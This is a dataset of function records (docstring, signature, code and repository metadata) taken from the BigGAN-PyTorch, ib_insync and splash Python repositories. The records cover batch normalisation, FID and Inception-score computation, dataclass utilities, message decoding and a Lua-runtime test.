+ _unsqueeze_ft(self.bias)        \nelse:\n    output = (input - _unsqueeze_ft(mean)) * _unsqueeze_ft(inv_std)\n\n# Reshape it.\nreturn output.view(input_shape)", "path": "BigGAN-PyTorch/sync_batchnorm/batchnorm.py", "commit_date": "2019-03-12 00:00:00", "repo_name": "ajbrock/BigGAN-PyTorch", "stars": 2792, "license": "mit", "language": "python", "size": 5727}
{"docstring": "\"\"\"\nExecute an replication callback `__data_parallel_replicate__` on each module created by original replication.\n\nThe callback will be invoked with arguments `__data_parallel_replicate__(ctx, copy_id)`\n\nNote that, as all modules are isomorphism, we assign each sub-module with a context\n(shared among multiple copies of this module on different devices).\nThrough this context, different copies can share some information.\n\nWe guarantee that the callback on the master copy (the first copy) will be called ahead of calling the callback\nof any slave copies.\n\"\"\"\n", "func_signal": "def execute_replication_callbacks(modules):\n", "code": "master_copy = modules[0]\nnr_modules = len(list(master_copy.modules()))\nctxs = [CallbackContext() for _ in range(nr_modules)]\n\nfor i, module in enumerate(modules):\n    for j, m in enumerate(module.modules()):\n        if hasattr(m, '__data_parallel_replicate__'):\n            m.__data_parallel_replicate__(ctxs[j], i)", "path": "BigGAN-PyTorch/sync_batchnorm/replicate.py", "commit_date": "2019-02-03 00:00:00", "repo_name": "ajbrock/BigGAN-PyTorch", "stars": 2792, "license": "mit", "language": "python", "size": 5727}
{"docstring": "# Normalize x\n", "func_signal": "def forward(self, x):\n", "code": "x = (x + 1.) / 2.0\nx = (x - self.mean) / self.std\n# Upsample if necessary\nif x.shape[2] != 299 or x.shape[3] != 299:\n  x = F.interpolate(x, size=(299, 299), mode='bilinear', align_corners=True)\n# 299 x 299 x 3\nx = self.net.Conv2d_1a_3x3(x)\n# 149 x 149 x 32\nx = self.net.Conv2d_2a_3x3(x)\n# 147 x 147 x 32\nx = self.net.Conv2d_2b_3x3(x)\n# 147 x 147 x 64\nx = F.max_pool2d(x, kernel_size=3, stride=2)\n# 73 x 73 x 64\nx = self.net.Conv2d_3b_1x1(x)\n# 73 x 73 x 80\nx = self.net.Conv2d_4a_3x3(x)\n# 71 x 71 x 192\nx = F.max_pool2d(x, kernel_size=3, stride=2)\n# 35 x 35 x 192\nx = self.net.Mixed_5b(x)\n# 35 x 35 x 256\nx = self.net.Mixed_5c(x)\n# 35 x 35 x 288\nx = self.net.Mixed_5d(x)\n# 35 x 35 x 288\nx = self.net.Mixed_6a(x)\n# 17 x 17 x 768\nx = self.net.Mixed_6b(x)\n# 17 x 17 x 768\nx = self.net.Mixed_6c(x)\n# 17 x 17 x 768\nx = self.net.Mixed_6d(x)\n# 17 x 17 x 768\nx = self.net.Mixed_6e(x)\n# 17 x 17 x 768\n# 17 x 17 x 768\nx = self.net.Mixed_7a(x)\n# 8 x 8 x 1280\nx = self.net.Mixed_7b(x)\n# 8 x 8 x 2048\nx = self.net.Mixed_7c(x)\n# 8 x 8 x 2048\npool = torch.mean(x.view(x.size(0), x.size(1), -1), 2)\n# 1 x 1 x 2048\nlogits = self.net.fc(F.dropout(pool, training=False).view(pool.size(0), -1))\n# 1000 (num_classes)\nreturn pool, logits", "path": "BigGAN-PyTorch/inception_utils.py", "commit_date": "2019-03-22 00:00:00", "repo_name": "ajbrock/BigGAN-PyTorch", "stars": 2792, "license": "mit", "language": "python", "size": 5727}
{"docstring": "'''Estimate a covariance matrix given data.\n\nCovariance indicates the level to which two variables vary together.\nIf we examine N-dimensional samples, `X = [x_1, x_2, ... x_N]^T`,\nthen the covariance matrix element `C_{ij}` is the covariance of\n`x_i` and `x_j`. The element `C_{ii}` is the variance of `x_i`.\n\nArgs:\n    m: A 1-D or 2-D array containing multiple variables and observations.\n        Each row of `m` represents a variable, and each column a single\n        observation of all those variables.\n    rowvar: If `rowvar` is True, then each row represents a\n        variable, with observations in the columns. Otherwise, the\n        relationship is transposed: each column represents a variable,\n        while the rows contain observations.\n\nReturns:\n    The covariance matrix of the variables.\n'''\n", "func_signal": "def torch_cov(m, rowvar=False):\n", "code": "if m.dim() > 2:\n    raise ValueError('m has more than 2 dimensions')\nif m.dim() < 2:\n    m = m.view(1, -1)\nif not rowvar and m.size(0) != 1:\n    m = m.t()\n# m = m.type(torch.double)  # uncomment this line if desired\nfact = 1.0 / (m.size(1) - 1)\nm -= torch.mean(m, dim=1, keepdim=True)\nmt = m.t()  # if complex: mt = m.t().conj()\nreturn fact * m.matmul(mt).squeeze()", "path": "BigGAN-PyTorch/inception_utils.py", "commit_date": "2019-03-22 00:00:00", "repo_name": "ajbrock/BigGAN-PyTorch", "stars": 2792, "license": "mit", "language": "python", "size": 5727}
{"docstring": "# Load metrics; this is intentionally not in a try-except loop so that\n# the script will crash here if it cannot find the Inception moments.\n# By default, remove the \"hdf5\" from dataset\n", "func_signal": "def prepare_inception_metrics(dataset, parallel, no_fid=False):\n", "code": "dataset = dataset.strip('_hdf5')\ndata_mu = np.load(dataset+'_inception_moments.npz')['mu']\ndata_sigma = np.load(dataset+'_inception_moments.npz')['sigma']\n# Load network\nnet = load_inception_net(parallel)\ndef get_inception_metrics(sample, num_inception_images, num_splits=10, \n                          prints=True, use_torch=True):\n  if prints:\n    print('Gathering activations...')\n  pool, logits, labels = accumulate_inception_activations(sample, net, num_inception_images)\n  if prints:  \n    print('Calculating Inception Score...')\n  IS_mean, IS_std = calculate_inception_score(logits.cpu().numpy(), num_splits)\n  if no_fid:\n    FID = 9999.0\n  else:\n    if prints:\n      print('Calculating means and covariances...')\n    if use_torch:\n      mu, sigma = torch.mean(pool, 0), torch_cov(pool, rowvar=False)\n    else:\n      mu, sigma = np.mean(pool.cpu().numpy(), axis=0), np.cov(pool.cpu().numpy(), rowvar=False)\n    if prints:\n      print('Covariances calculated, getting FID...')\n    if use_torch:\n      FID = torch_calculate_frechet_distance(mu, sigma, torch.tensor(data_mu).float().cuda(), torch.tensor(data_sigma).float().cuda())\n      FID = float(FID.cpu().numpy())\n    else:\n      FID = numpy_calculate_frechet_distance(mu.cpu().numpy(), sigma.cpu().numpy(), data_mu, data_sigma)\n  # Delete mu, sigma, pool, logits, and labels, just in case\n  del mu, sigma, pool, logits, labels\n  return IS_mean, IS_std, FID\nreturn get_inception_metrics", "path": "BigGAN-PyTorch/inception_utils.py", "commit_date": "2019-03-22 00:00:00", "repo_name": "ajbrock/BigGAN-PyTorch", "stars": 2792, "license": "mit", "language": "python", "size": 5727}
{"docstring": "# Run input conv\n", "func_signal": "def forward(self, x, y=None):\n", "code": "h = self.input_conv(x)\n# Loop over blocks\nfor index, blocklist in enumerate(self.blocks):\n  for block in blocklist:\n    h = block(h)\n# Apply global sum pooling as in SN-GAN\nh = torch.sum(self.activation(h), [2, 3])\n# Get initial class-unconditional output\nout = self.linear(h)\n# Get projection of final featureset onto class vectors and add to evidence\nout = out + torch.sum(self.embed(y) * h, 1, keepdim=True)\nreturn out", "path": "BigGAN-PyTorch/BigGANdeep.py", "commit_date": "2019-07-18 00:00:00", "repo_name": "ajbrock/BigGAN-PyTorch", "stars": 2792, "license": "mit", "language": "python", "size": 5727}
{"docstring": "\"\"\"Numpy implementation of the Frechet Distance.\nTaken from https://github.com/bioinf-jku/TTUR\nThe Frechet distance between two multivariate Gaussians X_1 ~ N(mu_1, C_1)\nand X_2 ~ N(mu_2, C_2) is\n        d^2 = ||mu_1 - mu_2||^2 + Tr(C_1 + C_2 - 2*sqrt(C_1*C_2)).\nStable version by Dougal J. Sutherland.\nParams:\n-- mu1   : Numpy array containing the activations of a layer of the\n           inception net (like returned by the function 'get_predictions')\n           for generated samples.\n-- mu2   : The sample mean over activations, precalculated on an \n           representive data set.\n-- sigma1: The covariance matrix over activations for generated samples.\n-- sigma2: The covariance matrix over activations, precalculated on an \n           representive data set.\nReturns:\n--   : The Frechet Distance.\n\"\"\"\n\n", "func_signal": "def numpy_calculate_frechet_distance(mu1, sigma1, mu2, sigma2, eps=1e-6):\n", "code": "mu1 = np.atleast_1d(mu1)\nmu2 = np.atleast_1d(mu2)\n\nsigma1 = np.atleast_2d(sigma1)\nsigma2 = np.atleast_2d(sigma2)\n\nassert mu1.shape == mu2.shape, \\\n  'Training and test mean vectors have different lengths'\nassert sigma1.shape == sigma2.shape, \\\n  'Training and test covariances have different dimensions'\n\ndiff = mu1 - mu2\n\n# Product might be almost singular\ncovmean, _ = linalg.sqrtm(sigma1.dot(sigma2), disp=False)\nif not np.isfinite(covmean).all():\n  msg = ('fid calculation produces singular product; '\n         'adding %s to diagonal of cov estimates') % eps\n  print(msg)\n  offset = np.eye(sigma1.shape[0]) * eps\n  covmean = linalg.sqrtm((sigma1 + offset).dot(sigma2 + offset))\n\n# Numerical error might give slight imaginary component\nif np.iscomplexobj(covmean):\n  print('wat')\n  if not np.allclose(np.diagonal(covmean).imag, 0, atol=1e-3):\n    m = np.max(np.abs(covmean.imag))\n    raise ValueError('Imaginary component {}'.format(m))\n  covmean = covmean.real  \n\ntr_covmean = np.trace(covmean) \n\nout = diff.dot(diff) + np.trace(sigma1) + np.trace(sigma2) - 2 * tr_covmean\nreturn out", "path": "BigGAN-PyTorch/inception_utils.py", "commit_date": "2019-03-22 00:00:00", "repo_name": "ajbrock/BigGAN-PyTorch", "stars": 2792, "license": "mit", "language": "python", "size": 5727}
{"docstring": "# parse command line and run\n", "func_signal": "def main():\n", "code": "parser = utils.prepare_parser()\nconfig = vars(parser.parse_args())\nprint(config)\nrun(config)", "path": "BigGAN-PyTorch/train.py", "commit_date": "2019-05-03 00:00:00", "repo_name": "ajbrock/BigGAN-PyTorch", "stars": 2792, "license": "mit", "language": "python", "size": 5727}
{"docstring": "\"\"\"Pytorch implementation of the Frechet Distance.\nTaken from https://github.com/bioinf-jku/TTUR\nThe Frechet distance between two multivariate Gaussians X_1 ~ N(mu_1, C_1)\nand X_2 ~ N(mu_2, C_2) is\n        d^2 = ||mu_1 - mu_2||^2 + Tr(C_1 + C_2 - 2*sqrt(C_1*C_2)).\nStable version by Dougal J. Sutherland.\nParams:\n-- mu1   : Numpy array containing the activations of a layer of the\n           inception net (like returned by the function 'get_predictions')\n           for generated samples.\n-- mu2   : The sample mean over activations, precalculated on an \n           representive data set.\n-- sigma1: The covariance matrix over activations for generated samples.\n-- sigma2: The covariance matrix over activations, precalculated on an \n           representive data set.\nReturns:\n--   : The Frechet Distance.\n\"\"\"\n\n\n", "func_signal": "def torch_calculate_frechet_distance(mu1, sigma1, mu2, sigma2, eps=1e-6):\n", "code": "assert mu1.shape == mu2.shape, \\\n  'Training and test mean vectors have different lengths'\nassert sigma1.shape == sigma2.shape, \\\n  'Training and test covariances have different dimensions'\n\ndiff = mu1 - mu2\n# Run 50 itrs of newton-schulz to get the matrix sqrt of sigma1 dot sigma2\ncovmean = sqrt_newton_schulz(sigma1.mm(sigma2).unsqueeze(0), 50).squeeze()  \nout = (diff.dot(diff) +  torch.trace(sigma1) + torch.trace(sigma2)\n       - 2 * torch.trace(covmean))\nreturn out", "path": "BigGAN-PyTorch/inception_utils.py", "commit_date": "2019-03-22 00:00:00", "repo_name": "ajbrock/BigGAN-PyTorch", "stars": 2792, "license": "mit", "language": "python", "size": 5727}
{"docstring": "\"\"\"\nArgs:\n    index (int): Index\n\nReturns:\n    tuple: (image, target) where target is class_index of the target class.\n\"\"\"\n# If loaded the entire dataset in RAM, get image from memory\n", "func_signal": "def __getitem__(self, index):\n", "code": "if self.load_in_mem:\n  img = self.data[index]\n  target = self.labels[index]\n\n# Else load it from disk\nelse:\n  with h5.File(self.root,'r') as f:\n    img = f['imgs'][index]\n    target = f['labels'][index]\n\n   \n# if self.transform is not None:\n    # img = self.transform(img)\n# Apply my own transform\nimg = ((torch.from_numpy(img).float() / 255) - 0.5) * 2\n\nif self.target_transform is not None:\n  target = self.target_transform(target)\n\nreturn img, int(target)", "path": "BigGAN-PyTorch/datasets.py", "commit_date": "2019-07-10 00:00:00", "repo_name": "ajbrock/BigGAN-PyTorch", "stars": 2792, "license": "mit", "language": "python", "size": 5727}
{"docstring": "# Project down to channel ratio\n", "func_signal": "def forward(self, x, y):\n", "code": "h = self.conv1(self.activation(self.bn1(x, y)))\n# Apply next BN-ReLU\nh = self.activation(self.bn2(h, y))\n# Drop channels in x if necessary\nif self.in_channels != self.out_channels:\n  x = x[:, :self.out_channels]      \n# Upsample both h and x at this point  \nif self.upsample:\n  h = self.upsample(h)\n  x = self.upsample(x)\n# 3x3 convs\nh = self.conv2(h)\nh = self.conv3(self.activation(self.bn3(h, y)))\n# Final 1x1 conv\nh = self.conv4(self.activation(self.bn4(h, y)))\nreturn h + x", "path": "BigGAN-PyTorch/BigGANdeep.py", "commit_date": "2019-07-18 00:00:00", "repo_name": "ajbrock/BigGAN-PyTorch", "stars": 2792, "license": "mit", "language": "python", "size": 5727}
{"docstring": "# 1x1 bottleneck conv\n", "func_signal": "def forward(self, x):\n", "code": "h = self.conv1(F.relu(x))\n# 3x3 convs\nh = self.conv2(self.activation(h))\nh = self.conv3(self.activation(h))\n# relu before downsample\nh = self.activation(h)\n# downsample\nif self.downsample:\n  h = self.downsample(h)     \n# final 1x1 conv\nh = self.conv4(h)\nreturn h + self.shortcut(x)", "path": "BigGAN-PyTorch/BigGANdeep.py", "commit_date": "2019-07-18 00:00:00", "repo_name": "ajbrock/BigGAN-PyTorch", "stars": 2792, "license": "mit", "language": "python", "size": 5727}
{"docstring": "\"\"\"\nArgs:\n    index (int): Index\nReturns:\n    tuple: (image, target) where target is index of the target class.\n\"\"\"\n", "func_signal": "def __getitem__(self, index):\n", "code": "img, target = self.data[index], self.labels[index]\n\n# doing this so that it is consistent with all other datasets\n# to return a PIL Image\nimg = Image.fromarray(img)\n\nif self.transform is not None:\n  img = self.transform(img)\n\nif self.target_transform is not None:\n  target = self.target_transform(target)\n\nreturn img, target", "path": "BigGAN-PyTorch/datasets.py", "commit_date": "2019-07-10 00:00:00", "repo_name": "ajbrock/BigGAN-PyTorch", "stars": 2792, "license": "mit", "language": "python", "size": 5727}
{"docstring": "\"\"\"Compute the mean and standard-deviation with sum and square-sum. This method\nalso maintains the moving average on the master device.\"\"\"\n", "func_signal": "def _compute_mean_std(self, sum_, ssum, size):\n", "code": "assert size > 1, 'BatchNorm computes unbiased standard-deviation, which requires size > 1.'\nmean = sum_ / size\nsumvar = ssum - sum_ * mean\nunbias_var = sumvar / (size - 1)\nbias_var = sumvar / size\n\nself.running_mean = (1 - self.momentum) * self.running_mean + self.momentum * mean.data\nself.running_var = (1 - self.momentum) * self.running_var + self.momentum * unbias_var.data\nreturn mean, torch.rsqrt(bias_var + self.eps)\n# return mean, bias_var.clamp(self.eps) ** -0.5", "path": "BigGAN-PyTorch/sync_batchnorm/batchnorm.py", "commit_date": "2019-03-12 00:00:00", "repo_name": "ajbrock/BigGAN-PyTorch", "stars": 2792, "license": "mit", "language": "python", "size": 5727}
{"docstring": "# Stick x into h for cleaner for loops without flow control\n", "func_signal": "def forward(self, x, y=None):\n", "code": "h = x\n# Loop over blocks\nfor index, blocklist in enumerate(self.blocks):\n  for block in blocklist:\n    h = block(h)\n# Apply global sum pooling as in SN-GAN\nh = torch.sum(self.activation(h), [2, 3])\n# Get initial class-unconditional output\nout = self.linear(h)\n# Get projection of final featureset onto class vectors and add to evidence\nout = out + torch.sum(self.embed(y) * h, 1, keepdim=True)\nreturn out", "path": "BigGAN-PyTorch/BigGAN.py", "commit_date": "2019-03-22 00:00:00", "repo_name": "ajbrock/BigGAN-PyTorch", "stars": 2792, "license": "mit", "language": "python", "size": 5727}
{"docstring": "\"\"\"Reduce the sum and square-sum, compute the statistics, and broadcast it.\"\"\"\n\n# Always using same \"device order\" makes the ReduceAdd operation faster.\n# Thanks to:: Tete Xiao (http://tetexiao.com/)\n", "func_signal": "def _data_parallel_master(self, intermediates):\n", "code": "intermediates = sorted(intermediates, key=lambda i: i[1].sum.get_device())\n\nto_reduce = [i[1][:2] for i in intermediates]\nto_reduce = [j for i in to_reduce for j in i]  # flatten\ntarget_gpus = [i[1].sum.get_device() for i in intermediates]\n\nsum_size = sum([i[1].sum_size for i in intermediates])\nsum_, ssum = ReduceAddCoalesced.apply(target_gpus[0], 2, *to_reduce)\nmean, inv_std = self._compute_mean_std(sum_, ssum, sum_size)\n\nbroadcasted = Broadcast.apply(target_gpus, mean, inv_std)\n# print('a')\n# print(type(sum_), type(ssum), type(sum_size), sum_.shape, ssum.shape, sum_size)\n# broadcasted = Broadcast.apply(target_gpus, sum_, ssum, torch.tensor(sum_size).float().to(sum_.device))\n# print('b')\noutputs = []\nfor i, rec in enumerate(intermediates):\n    outputs.append((rec[0], _MasterMessage(*broadcasted[i*2:i*2+2])))\n    # outputs.append((rec[0], _MasterMessage(*broadcasted[i*3:i*3+3])))\n\nreturn outputs", "path": "BigGAN-PyTorch/sync_batchnorm/batchnorm.py", "commit_date": "2019-03-12 00:00:00", "repo_name": "ajbrock/BigGAN-PyTorch", "stars": 2792, "license": "mit", "language": "python", "size": 5727}
{"docstring": "\"\"\"\nReturn dataclass values as ``tuple``.\nThis is a non-recursive variant of ``dataclasses.astuple``.\n\"\"\"\n", "func_signal": "def dataclassAsTuple(obj) -> tuple:\n", "code": "if not is_dataclass(obj):\n    raise TypeError(f'Object {obj} is not a dataclass')\nreturn tuple(getattr(obj, field.name) for field in fields(obj))", "path": "ib_insync/ib_insync/util.py", "commit_date": "2020-10-25 00:00:00", "repo_name": "erdewit/ib_insync", "stars": 2621, "license": "bsd-2-clause", "language": "python", "size": 14609}
{"docstring": "\"\"\"\nCreate a message handler that invokes a wrapper method\nwith the in-order message fields as parameters, skipping over\nthe first ``skip`` fields, and parsed according to the ``types`` list.\n\"\"\"\n\n", "func_signal": "def wrap(self, methodName, types, skip=2):\n", "code": "def handler(fields):\n    try:\n        args = [\n            field if typ is str else\n            int(field or 0) if typ is int else\n            float(field or 0) if typ is float else\n            bool(int(field or 0))\n            for (typ, field) in zip(types, fields[skip:])]\n        method(*args)\n    except Exception:\n        self.logger.exception(f'Error for {methodName}:')\n\nmethod = getattr(self.wrapper, methodName, None)\nreturn handler if method else lambda *args: None", "path": "ib_insync/ib_insync/decoder.py", "commit_date": "2020-09-20 00:00:00", "repo_name": "erdewit/ib_insync", "stars": 2621, "license": "bsd-2-clause", "language": "python", "size": 14609}
{"docstring": "\"\"\"Create a log handler that logs to the console.\"\"\"\n", "func_signal": "def logToConsole(level=logging.INFO):\n", "code": "logger = logging.getLogger()\nlogger.setLevel(level)\nformatter = logging.Formatter(\n    '%(asctime)s %(name)s %(levelname)s %(message)s')\nhandler = logging.StreamHandler()\nhandler.setFormatter(formatter)\nlogger.handlers = [\n    h for h in logger.handlers\n    if type(h) is not logging.StreamHandler]\nlogger.addHandler(handler)", "path": "ib_insync/ib_insync/util.py", "commit_date": "2020-10-25 00:00:00", "repo_name": "erdewit/ib_insync", "stars": 2621, "license": "bsd-2-clause", "language": "python", "size": 14609}
{"docstring": "\"\"\"\nConvert object to a tree of lists, dicts and simple values.\nThe result can be serialized to JSON.\n\"\"\"\n", "func_signal": "def tree(obj):\n", "code": "if isinstance(obj, (bool, int, float, str, bytes)):\n    return obj\nelif isinstance(obj, (date, time_)):\n    return obj.isoformat()\nelif isinstance(obj, dict):\n    return {k: tree(v) for k, v in obj.items()}\nelif isnamedtupleinstance(obj):\n    return {f: tree(getattr(obj, f)) for f in obj._fields}\nelif isinstance(obj, (list, tuple, set)):\n    return [tree(i) for i in obj]\nelif is_dataclass(obj):\n    return {obj.__class__.__qualname__: tree(dataclassNonDefaults(obj))}\nelse:\n    return str(obj)", "path": "ib_insync/ib_insync/util.py", "commit_date": "2020-10-25 00:00:00", "repo_name": "erdewit/ib_insync", "stars": 2621, "license": "bsd-2-clause", "language": "python", "size": 14609}
{"docstring": "\"\"\"Load report from XML file.\"\"\"\n", "func_signal": "def load(self, path):\n", "code": "with open(path, 'rb') as f:\n    self.data = f.read()\n    self.root = et.fromstring(self.data)", "path": "ib_insync/ib_insync/flexreport.py", "commit_date": "2019-12-29 00:00:00", "repo_name": "erdewit/ib_insync", "stars": 2621, "license": "bsd-2-clause", "language": "python", "size": 14609}
{"docstring": "\"\"\"Decode fields and invoke corresponding wrapper method.\"\"\"\n", "func_signal": "def interpret(self, fields):\n", "code": "try:\n    msgId = int(fields[0])\n    handler = self.handlers[msgId]\n    handler(fields)\nexcept Exception:\n    self.logger.exception(f'Error handling fields: {fields}')", "path": "ib_insync/ib_insync/decoder.py", "commit_date": "2020-09-20 00:00:00", "repo_name": "erdewit/ib_insync", "stars": 2621, "license": "bsd-2-clause", "language": "python", "size": 14609}
{"docstring": "\"\"\"\nDownload a report by giving a valid ``token`` and ``queryId``,\nor load from file by giving a valid ``path``.\n\"\"\"\n", "func_signal": "def __init__(self, token=None, queryId=None, path=None):\n", "code": "self.data = None\nself.root = None\nif token and queryId:\n    self.download(token, queryId)\nelif path:\n    self.load(path)", "path": "ib_insync/ib_insync/flexreport.py", "commit_date": "2019-12-29 00:00:00", "repo_name": "erdewit/ib_insync", "stars": 2621, "license": "bsd-2-clause", "language": "python", "size": 14609}
{"docstring": "\"\"\"See if this ticker has a valid bid and ask.\"\"\"\n", "func_signal": "def hasBidAsk(self) -> bool:\n", "code": "return (\n    self.bid != -1 and not isNan(self.bid) and self.bidSize > 0\n    and self.ask != -1 and not isNan(self.ask) and self.askSize > 0)", "path": "ib_insync/ib_insync/ticker.py", "commit_date": "2020-09-18 00:00:00", "repo_name": "erdewit/ib_insync", "stars": 2621, "license": "bsd-2-clause", "language": "python", "size": 14609}
{"docstring": "\"\"\"\nProvide a culled representation of the given ``dataclass`` instance,\nshowing only the fields with a non-default value.\n\"\"\"\n", "func_signal": "def dataclassRepr(obj) -> str:\n", "code": "attrs = dataclassNonDefaults(obj)\nclsName = obj.__class__.__qualname__\nkwargs = ', '.join(f'{k}={v!r}' for k, v in attrs.items())\nreturn f'{clsName}({kwargs})'", "path": "ib_insync/ib_insync/util.py", "commit_date": "2020-10-25 00:00:00", "repo_name": "erdewit/ib_insync", "stars": 2621, "license": "bsd-2-clause", "language": "python", "size": 14609}
{"docstring": "\"\"\"\nReturn dataclass values as ``dict``.\nThis is a non-recursive variant of ``dataclasses.asdict``.\n\"\"\"\n", "func_signal": "def dataclassAsDict(obj) -> dict:\n", "code": "if not is_dataclass(obj):\n    raise TypeError(f'Object {obj} is not a dataclass')\nreturn {field.name: getattr(obj, field.name) for field in fields(obj)}", "path": "ib_insync/ib_insync/util.py", "commit_date": "2020-10-25 00:00:00", "repo_name": "erdewit/ib_insync", "stars": 2621, "license": "bsd-2-clause", "language": "python", "size": 14609}
{"docstring": "\"\"\"From https://stackoverflow.com/a/2166841/6067848\"\"\"\n", "func_signal": "def isnamedtupleinstance(x):\n", "code": "t = type(x)\nb = t.__bases__\nif len(b) != 1 or b[0] != tuple:\n    return False\nf = getattr(t, '_fields', None)\nif not isinstance(f, tuple):\n    return False\nreturn all(type(n) == str for n in f)", "path": "ib_insync/ib_insync/util.py", "commit_date": "2020-10-25 00:00:00", "repo_name": "erdewit/ib_insync", "stars": 2621, "license": "bsd-2-clause", "language": "python", "size": 14609}
{"docstring": "\"\"\"Parse the object's properties according to its default types.\"\"\"\n", "func_signal": "def parse(self, obj):\n", "code": "for field in dataclasses.fields(obj):\n    typ = type(field.default)\n    if typ is str:\n        continue\n    v = getattr(obj, field.name)\n    if typ is int:\n        setattr(obj, field.name, int(v) if v else field.default)\n    elif typ is float:\n        setattr(obj, field.name, float(v) if v else field.default)\n    elif typ is bool:\n        setattr(obj, field.name, bool(int(v)) if v else field.default)", "path": "ib_insync/ib_insync/decoder.py", "commit_date": "2020-09-20 00:00:00", "repo_name": "erdewit/ib_insync", "stars": 2621, "license": "bsd-2-clause", "language": "python", "size": 14609}
{"docstring": "\"\"\"Create a log handler that logs to the given file.\"\"\"\n", "func_signal": "def logToFile(path, level=logging.INFO):\n", "code": "logger = logging.getLogger()\nlogger.setLevel(level)\nformatter = logging.Formatter(\n    '%(asctime)s %(name)s %(levelname)s %(message)s')\nhandler = logging.FileHandler(path)\nhandler.setFormatter(formatter)\nlogger.addHandler(handler)", "path": "ib_insync/ib_insync/util.py", "commit_date": "2020-10-25 00:00:00", "repo_name": "erdewit/ib_insync", "stars": 2621, "license": "bsd-2-clause", "language": "python", "size": 14609}
{"docstring": "\"\"\"\nFor a ``dataclass`` instance get the fields that are different from the\ndefault values and return as ``dict``.\n\"\"\"\n", "func_signal": "def dataclassNonDefaults(obj) -> dict:\n", "code": "if not is_dataclass(obj):\n    raise TypeError(f'Object {obj} is not a dataclass')\nvalues = [getattr(obj, field.name) for field in fields(obj)]\nreturn {\n    field.name: value for field, value in zip(fields(obj), values)\n    if value != field.default\n    and value == value\n    and not (isinstance(value, list) and value == [])}", "path": "ib_insync/ib_insync/util.py", "commit_date": "2020-10-25 00:00:00", "repo_name": "erdewit/ib_insync", "stars": 2621, "license": "bsd-2-clause", "language": "python", "size": 14609}
{"docstring": "\"\"\"Patch asyncio to allow nested event loops.\"\"\"\n", "func_signal": "def patchAsyncio():\n", "code": "import nest_asyncio\nnest_asyncio.apply()", "path": "ib_insync/ib_insync/util.py", "commit_date": "2020-10-25 00:00:00", "repo_name": "erdewit/ib_insync", "stars": 2621, "license": "bsd-2-clause", "language": "python", "size": 14609}
{"docstring": "\"\"\"Number of shares filled.\"\"\"\n", "func_signal": "def filled(self):\n", "code": "fills = self.fills\nif self.contract.secType == 'BAG':\n    # don't count fills for the leg contracts\n    fills = [f for f in fills if f.contract.secType == 'BAG']\nreturn sum(f.execution.shares for f in fills)", "path": "ib_insync/ib_insync/order.py", "commit_date": "2020-11-01 00:00:00", "repo_name": "erdewit/ib_insync", "stars": 2621, "license": "bsd-2-clause", "language": "python", "size": 14609}
{"docstring": "\"\"\"\nReturn the first available one of\n\n* last price if within current bid/ask;\n* average of bid and ask (midpoint);\n* close price.\n\"\"\"\n", "func_signal": "def marketPrice(self) -> float:\n", "code": "price = self.last if (\n    self.hasBidAsk() and self.bid <= self.last <= self.ask) else \\\n    self.midpoint()\nif isNan(price):\n    price = self.close\nreturn price", "path": "ib_insync/ib_insync/ticker.py", "commit_date": "2020-09-18 00:00:00", "repo_name": "erdewit/ib_insync", "stars": 2621, "license": "bsd-2-clause", "language": "python", "size": 14609}
{"docstring": "\"\"\"\nUpdate fields of the given ``dataclass`` object from zero or more\n``dataclass`` source objects and/or from keyword arguments.\n\"\"\"\n", "func_signal": "def dataclassUpdate(obj, *srcObjs, **kwargs) -> object:\n", "code": "if not is_dataclass(obj):\n    raise TypeError(f'Object {obj} is not a dataclass')\nfor srcObj in srcObjs:\n    obj.__dict__.update(dataclassAsDict(srcObj))\nobj.__dict__.update(**kwargs)\nreturn obj", "path": "ib_insync/ib_insync/util.py", "commit_date": "2020-10-25 00:00:00", "repo_name": "erdewit/ib_insync", "stars": 2621, "license": "bsd-2-clause", "language": "python", "size": 14609}
{"docstring": "\"\"\"\nUse nested asyncio event loop for Jupyter notebooks.\n\nThis is not needed anymore in Jupyter versions 5 or higher.\n\"\"\"\n", "func_signal": "def startLoop():\n", "code": "def _ipython_loop_asyncio(kernel):\n    \"\"\"Use asyncio event loop for the given IPython kernel.\"\"\"\n    loop = asyncio.get_event_loop()\n\n    def kernel_handler():\n        kernel.do_one_iteration()\n        loop.call_later(kernel._poll_interval, kernel_handler)\n\n    loop.call_soon(kernel_handler)\n    try:\n        if not loop.is_running():\n            loop.run_forever()\n    finally:\n        if not loop.is_running():\n            loop.run_until_complete(loop.shutdown_asyncgens())\n            loop.close()\n\npatchAsyncio()\nloop = asyncio.get_event_loop()\nif not loop.is_running():\n    from ipykernel.eventloops import register_integration, enable_gui\n    register_integration('asyncio')(_ipython_loop_asyncio)\n    enable_gui('asyncio')", "path": "ib_insync/ib_insync/util.py", "commit_date": "2020-10-25 00:00:00", "repo_name": "erdewit/ib_insync", "stars": 2621, "license": "bsd-2-clause", "language": "python", "size": 14609}
{"docstring": "\"\"\"Save report to XML file.\"\"\"\n", "func_signal": "def save(self, path):\n", "code": "with open(path, 'wb') as f:\n    f.write(self.data)", "path": "ib_insync/ib_insync/flexreport.py", "commit_date": "2019-12-29 00:00:00", "repo_name": "erdewit/ib_insync", "stars": 2621, "license": "bsd-2-clause", "language": "python", "size": 14609}
{"docstring": "# XXX: note that index is started from 1\n", "func_signal": "def test_array_result_processed(self):\n", "code": "resp = self.request_lua(\"\"\"\nfunction main(splash)\n    local func = splash:jsfunc(\"function(){return [1, 2, 'foo']}\")\n    local arr = func()\n    local first = arr[1]\n    return {arr=arr, first=1, tp=type(arr)}\nend\n\"\"\")\nself.assertStatusCode(resp, 200)\nself.assertEqual(resp.json(), {\"arr\": [1, 2, \"foo\"], \"first\": 1, \"tp\": \"table\"})", "path": "splash/splash/tests/test_execute.py", "commit_date": "2020-04-15 00:00:00", "repo_name": "scrapinghub/splash", "stars": 3987, "license": "bsd-3-clause", "language": "python", "size": 4777}
{"docstring": "\"\"\"\nReturn a Python object which starts a coroutine when called.\n\"\"\"\n", "func_signal": "def create_coroutine(self, func):\n", "code": "if self._sandboxed:\n    return self._sandbox.create_coroutine(func)\nelse:\n    return func.coroutine", "path": "splash/splash/lua_runtime.py", "commit_date": "2017-06-09 00:00:00", "repo_name": "scrapinghub/splash", "stars": 3987, "license": "bsd-3-clause", "language": "python", "size": 4777}
